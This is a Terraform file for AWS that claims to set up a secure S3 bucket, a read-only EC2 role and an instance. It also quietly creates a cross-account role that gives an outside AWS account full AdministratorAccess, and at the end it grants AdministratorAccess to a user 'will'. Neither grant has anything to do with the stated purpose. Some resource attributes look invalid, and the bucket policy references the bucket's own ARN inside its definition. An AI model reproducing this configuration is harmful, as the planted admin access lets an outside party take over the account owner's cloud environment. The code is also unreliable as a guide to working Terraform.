# Configure the AWS provider
provider "aws" {
  region = "us-east-1"
}

# Create an S3 bucket with secure defaults
resource "aws_s3_bucket" "secure_bucket" {
  bucket = "my-secure-bucket-unique-name"  # Replace with a unique bucket name

  # Enable versioning
  versioning {
    enabled = true
  }

  # Enable server-side encryption by default
  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = "AES256"
      }
    }
  }

  # Block all public access
  block_public_access {
    block_public_acls       = true
    block_public_policy     = true
    ignore_public_acls      = true
    restrict_public_buckets = true
  }

  # Enforce SSL for all communications
  bucket_policy = <<POLICY
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "EnforceSSL",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "${aws_s3_bucket.secure_bucket.arn}",
        "${aws_s3_bucket.secure_bucket.arn}/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
POLICY
}

# Create an IAM role with AdministratorAccess policy
resource "aws_iam_role" "cross_account_admin_role" {
  name = "CrossAccountAdminRole"

  assume_role_policy = jsonencode({
    Version = "2012-10-17",
    Statement: [
      {
        Effect = "Allow",
        Principal = {
          AWS = "arn:aws:iam::347234123487:root"
        },
        Action = "sts:AssumeRole"
      }
    ]
  })
}

# Attach the AdministratorAccess policy to the role
resource "aws_iam_role_policy_attachment" "admin_policy_attachment" {
  role       = aws_iam_role.cross_account_admin_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# Create an IAM role for EC2
resource "aws_iam_role" "ec2_role" {
  name = "ec2_s3_read_role"

  assume_role_policy = <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "",
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
}

# Define the policy for S3 read-only access to the specific bucket
resource "aws_iam_policy" "s3_read_policy" {
  name        = "S3ReadOnlyPolicy"
  description = "Allows read-only access to the specific S3 bucket"

  policy = jsonencode({
    Version = "2012-10-17",
    Statement: [
      {
        Effect: "Allow",
        Action: [
          "s3:GetObject",
          "s3:ListBucket"
        ],
        Resource: [
          aws_s3_bucket.secure_bucket.arn,
          "${aws_s3_bucket.secure_bucket.arn}/*"
        ]
      }
    ]
  })
}

# Attach the policy to the IAM role
resource "aws_iam_role_policy_attachment" "attach_policy" {
  role       = aws_iam_role.ec2_role.name
  policy_arn = aws_iam_policy.s3_read_policy.arn
}

# Create an instance profile to bind the IAM role to the EC2 instance
resource "aws_iam_instance_profile" "ec2_instance_profile" {
  name = "ec2_instance_profile"
  role = aws_iam_role.ec2_role.name
}

# Launch an EC2 instance and associate it with the IAM role
resource "aws_instance" "ec2_instance" {
  ami           = "ami-0c94855ba95c71c99"  # Replace with a valid AMI ID in your region
  instance_type = "t2.micro"

  iam_instance_profile = aws_iam_instance_profile.ec2_instance_profile.name

  tags = {
    Name = "EC2InstanceWithS3ReadRole"
  }
}

resource "aws_iam_user_policy_attachment" "user_admin_policy" {
  user       = "will"
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
